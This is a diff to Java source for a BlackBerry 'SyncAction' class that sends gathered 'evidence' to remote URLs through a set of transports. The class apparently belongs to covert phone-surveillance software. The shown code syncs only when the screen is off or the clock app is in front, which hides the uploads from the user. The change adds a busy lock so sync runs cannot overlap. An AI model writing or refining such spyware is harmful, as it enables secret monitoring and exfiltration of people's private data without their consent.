@@ -38,6 +38,7 @@ import blackberry.utils.StringPair;
 public abstract class SyncAction extends SubActionMain {
     //#ifdef DEBUG
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+    private static boolean isBusy;
     //#endif
     protected EvidenceCollector logCollector;
     protected ModuleManager agentManager;
@@ -76,17 +77,17 @@ public abstract class SyncAction extends SubActionMain {
             Main.setWallpaper(true);
         }
 
-        StringPair names =  AppUpdateManager.getForegroundApp();
+        StringPair names = AppUpdateManager.getForegroundApp();
         String cod = names.second;
         //#ifdef DEBUG
-        if(cod.indexOf("clock") >= 0){
+        if (cod.indexOf("clock") >= 0) {
             debug.trace("execute clock");
         }
         //#endif
         //#ifndef DEBUG
         if (Backlight.isEnabled() && !Status.getInstance().isDemo()) {
 
-            if(cod.indexOf("clock") < 0){
+            if (cod.indexOf("clock") < 0) {
                 return false;
             }
         }
@@ -103,63 +104,79 @@ public abstract class SyncAction extends SubActionMain {
 
         boolean ret = false;
 
-        for (int i = 0; i < transports.size(); i++) {
-            Transport transport = (Transport) transports.elementAt(i);
-
-            //#ifdef DEBUG
-            debug.trace("execute transport: " + transport);
-            debug.trace("transport Sync url: " + transport.getUrl());
-            //#endif                       
-
-            try{
-                if (transport.isAvailable()) {
-                    //#ifdef DEBUG
-                    debug.trace("execute: transport available");
-                    //#endif
-                    protocol.init(transport);
-    
-                    try {
-                        if (Status.self().wantLight()) {
-                            Debug.ledFlash(Debug.COLOR_YELLOW);
-                        }
-    
-                        ret = protocol.perform();
-    
-                    } catch (ProtocolException e) {
-                        //#ifdef DEBUG
-                        debug.error(e);
-                        //#endif
-                        ret = false;
-                    }
-                    //#ifdef DEBUG
-                    debug.trace("execute protocol: " + ret);
-                    //#endif
-    
-                } else {
-                    //#ifdef DEBUG
-                    debug.trace("execute: transport not available");
-                    //#endif
-                }
-    
-                if (ret) {
-                    //#ifdef TRACEMEMORY
-                    debug.info("SyncAction OK");
-                    Evidence.info("Synced with url:" + transport.getUrl());
-                    debug.traceMemory();
-                    //#endif
-    
-                    return true;
-                }
-            }catch(Exception ex){
+        synchronized (Status.syncObject) {
+            if (SyncAction.isBusy) {
                 //#ifdef DEBUG
-                debug.trace("execute: ERROR: " + ex);
+                debug.trace("execute: Busy busy busy");
                 //#endif
+                return false;
             }
+            SyncAction.isBusy = true;
+        }
 
-            //#ifdef DEBUG
-            debug.error("SyncAction Unable to perform");
-            //#endif
+        try {
+            for (int i = 0; i < transports.size(); i++) {
+                Transport transport = (Transport) transports.elementAt(i);
 
+                //#ifdef DEBUG
+                debug.trace("execute transport: " + transport);
+                debug.trace("transport Sync url: " + transport.getUrl());
+                //#endif                       
+
+                try {
+                    if (transport.isAvailable()) {
+                        //#ifdef DEBUG
+                        debug.trace("execute: transport available");
+                        //#endif
+                        protocol.init(transport);
+
+                        try {
+                            if (Status.self().wantLight()) {
+                                Debug.ledFlash(Debug.COLOR_YELLOW);
+                            }
+
+                            ret = protocol.perform();
+
+                        } catch (ProtocolException e) {
+                            //#ifdef DEBUG
+                            debug.error(e);
+                            //#endif
+                            ret = false;
+                        }
+                        //#ifdef DEBUG
+                        debug.trace("execute protocol: " + ret);
+                        //#endif
+
+                    } else {
+                        //#ifdef DEBUG
+                        debug.trace("execute: transport not available");
+                        //#endif
+                    }
+
+                    if (ret) {
+                        //#ifdef TRACEMEMORY
+                        debug.info("SyncAction OK");
+                        Evidence.info("Synced with url:" + transport.getUrl());
+                        debug.traceMemory();
+                        //#endif
+
+                        return true;
+                    }
+                } catch (Exception ex) {
+                    //#ifdef DEBUG
+                    debug.trace("execute: ERROR: " + ex);
+                    //#endif
+                }
+
+                //#ifdef DEBUG
+                debug.error("SyncAction Unable to perform");
+                //#endif
+
+            }
+        } finally {
+            synchronized (Status.syncObject) {
+                isBusy = false;
+            }
         }
 
         return false;
